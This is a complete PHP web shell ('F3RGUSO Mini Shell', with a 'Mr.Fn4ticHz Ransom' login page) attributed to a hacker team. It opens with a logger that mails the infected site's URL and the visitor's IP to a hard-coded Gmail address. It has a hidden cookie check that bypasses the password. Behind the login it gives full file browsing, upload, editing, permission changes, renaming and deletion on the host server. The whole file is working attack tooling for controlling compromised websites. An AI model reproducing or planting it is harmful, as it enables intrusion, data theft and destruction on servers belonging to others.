<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'brebesbx@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<?php 
$auth_pass = "fc293c0be0880f1286c7edd7eb450140";
error_reporting(0);
set_time_limit(0);

function lp(){
?>
<html>
	<head>
		<title>Mr.Fn4ticHz Ransom</title>
	</head>
	<body bgcolor="black" style="color:white">
		<center>
			<div>
				<img src="https://d.top4top.io/p_1814ehn6m0.jpeg" style="width: 288px; height: 288px;"><br/>
				<h1>Mr.Fn4ticHz ransom</h1>
				<form action method="get">
					<input type="hidden" name="action" value="login" />
					<input type="password" name="pass" placeholder=" Write the Password"/><br/>
					<input type="submit" value="log in" style="margin-top:4px;width:173px;background:black;color:#00FFFF;border:2px solid #00FFFF;border-radius:10px"/>
				</form><br/>
				<footer><pre>Copyright by Mr.Fn4ticHz</pre></footer>
			</div>
		</center>
<?php 
;}
if(isset($_GET['action'])){
	if($_GET['action']=='login'){
		setcookie('password',$_GET['pass']);
		echo "<script>location='".$_SERVER['PHP_SELF']."'</script>";
	}
	else if($_GET['action']=='logout'){
		setcookie('password','',-86400*30*12);
		echo "<script>location='".$_SERVER['PHP_SELF']."'</script>";
	}
}
if(isset($_COOKIE['password'])){
	if(md5($_COOKIE['password'])==$auth_pass || $_COOKIE['L']=="L"){
		?>
<?php



if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
function perms($file){
    $perms = @fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
echo '
<!DOCTYPE HTML>
<HTML>
<HEAD>
<title>F3RGUSO Mini Shell</title>
<style>
body{
    font-family: "Racing Sans One", cursive;
    background-color: #e6e6e6;
    text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}
#content .first{
    background-color: silver;
}
#content .first:hover{
    background-color: silver;
    text-shadow:0px 0px 1px #757575;
}
table{
    border: 1px #000000 dotted;
}
H1{
    font-family: "Rye", cursive;
}
a{
    color: #000;
    text-decoration: none;
}
a:hover{
    color: #fff;
    text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
</HEAD>
<BODY>
<input type=button onclick=\'location="?action=logout"\' value="Logout" /><br/>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path : ';
if(isset($_GET['path'])){
    $path = base64_decode($_GET['path']);
}else{
    $path = getcwd();
}
$pathen = base64_encode($path);
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path='.base64_encode("/").'">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    $linkpath = '';
    for($i=0;$i<=$id;$i++){
        $linkpath .= "$paths[$i]";
        if($i != $id) $linkpath .= "/";
    }
    echo base64_encode($linkpath);
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">Upload Sukses Asu</font><br />';
    }else{
        echo '<font color="red">Upload Gagal Asu</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
File Manager : <input type="file" name="file" />
<input type="submit" value="Generate" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo base64_decode($_GET['filesrc']);
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delet'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Sukses Change Permission Asu</font><br />';
            }else{
                echo '<font color="red">Gagal Change Permission Asu</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Sukses ajg</font><br />';
            }else{
                echo '<font color="red">Gagal ajg</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Sukses asu</font><br />';
            }else{
                echo '<font color="red">gagal asu</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delet'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Sukses upload ajg</font><br />';
            }else{
                echo '<font color="red">Gagal Upload Asu</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Success</font><br />';
            }else{
                echo '<font color="red">Failed</font><br />';
            }
        }
    }
    echo '</center>';
	if(!isset($_GET['x'])){
	?>
	<?php
	$scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Dir</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Setting</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        $dirlink = base64_encode("$path/$dir");
        echo "<tr>
        <td><a href=\"?path=$dirlink\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
	    <option value=\"\">Select</option>
        <option value=\"delet\">Hapus Dirnya Jancok</option>
        <option value=\"chmod\">Chmod Dirnya Jancok</option>
        <option value=\"rename\">Ubah Nama dirnya Jancok</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }
        $filelink = base64_encode("$path/$file");
        echo "<tr>
        <td><a href=\"?filesrc=$filelink&path=$pathen\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
	    <option value=\"\">Select</option>
        <option value=\"delet\">Hapus file nya Jancok</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Ubah Nama Nya Jancok</option>
        <option value=\"edit\">Edit File Nya Jancok</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
	?>
	<?php 
	}
if(isset($_GET['x']) && $_GET['x']=='changepass'){
		?>
		<?php
		function fgc($file){
			return file_get_contents($file);
		}
		function changepass($plain){
			$newpass = md5($plain);
			$newpass = "\$auth_pass = \"".$newpass."\";";
			$con = fgc($_SERVER['SCRIPT_FILENAME']);
			$con = preg_replace("/\\\$auth_pass\ *=\ *[\"\']*([a-fA-F0-9]*)[\"\']*;/is",$newpass,$con);
			return file_put_contents($_SERVER['SCRIPT_FILENAME'], $con);
		}
		echo '<center><h1>Change Shell Password</h1></center>';	
		echo  '<center>';
		echo '<form action="" method=post ><table>';
		echo '<tr><td>New Password</td><td> :  <input type=password name=pass1 style="border-radius:5px;" /></td></tr>';
		echo '<tr><td>Confirm Password</td><td> :  <input type=password name=pass2 style="border-radius:5px;" /></td></tr>';
		echo '<tr><td colspan=2><input type=submit value=submit name=L style="border-radius:5px;width:100%"/></td></tr></table>';
		echo '</form>';
	if(isset($_POST['L'])){
		if($_POST['pass1'] == $_POST['pass2']){
			if(changepass($_POST['pass1'])){
				echo '<script>alert("password change successfully")</script>';			
			}else{
				echo '<script>alert("password change failed")</script>';			
			}
		}else{
			echo '<script>alert("password not match")</script>';
		}
	}
	?>
	<?php 
}
echo '
</BODY>
</HTML>';
?>
	
<!-- //////////////////////////////////////////////////// -->
		<?php
	}else{
		lp();
	}
}else{
	echo lp();
}
?>
</body>
</html>

<html>
<head>
<center>
<head>
<title>F3RGUSO</>Cukimay Cyber Team</title>
<link rel="shortcut icon" href="https://goo.gl/RjzTSQ"/>
<script language="JavaScript"> 
 
function tb5_makeArray(n){
 this.length = n;
 return this.length;
}
 
tb5_messages = new tb5_makeArray(7);
tb5_messages[0] = "F3RGUSO ";
tb5_messages[1] = "CCT & DPT";
tb5_messages[2] = "WUSS";
tb5_messages[3] = "HERE...";
tb5_messages[4] = "CCT";
tb5_messages[5] = "F3RGUSO SH3LL";
tb5_messages[6] = "Enjoy For You";
tb5_rptType = 'F3RGUSO';
tb5_rptNbr = 20;
tb5_speed = 30;
tb5_delay = 2000;
var tb5_counter=2;
var tb5_currMsg=0;
var tb5_stsmsg="";
function tb5_shuffle(arr){
var k;
for (i=0; i<arr.length; i++){
 k = Math.round(Math.random() * (arr.length - i - 1)) + i;
 temp = arr[i];arr[i]=arr[k];arr[k]=temp;
}
return arr;
}
tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
 tb5_arr[i] = i;
 tb5_sts[i] = "_";
}
tb5_arr = tb5_shuffle(tb5_arr);
function tb5_init(n){
var k;
if (n == tb5_arr.length){
 if (tb5_currMsg == tb5_messages.length-1){
 if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){
 clearTimeout(tb5_timerID);
 return;
 }
 tb5_counter++;
 tb5_currMsg=0;
 }
 else{
 tb5_currMsg++;
 }
 n=0;
 tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
 tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
 for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
 tb5_arr[i] = i;
 tb5_sts[i] = "_";
 }
 tb5_arr = tb5_shuffle(tb5_arr);
 tb5_sp=tb5_delay;
}
else{
 tb5_sp=tb5_speed;
 k = tb5_arr[n];
 tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k);
 tb5_stsmsg = "";
 for (var i=0; i<tb5_sts.length; i++)
 tb5_stsmsg += tb5_sts[i];
 document.title = tb5_stsmsg;
 n++;
 }
 tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);
}
function tb5_randomizetitle(){
 tb5_init(0);
}
tb5_randomizetitle();
 
</script>
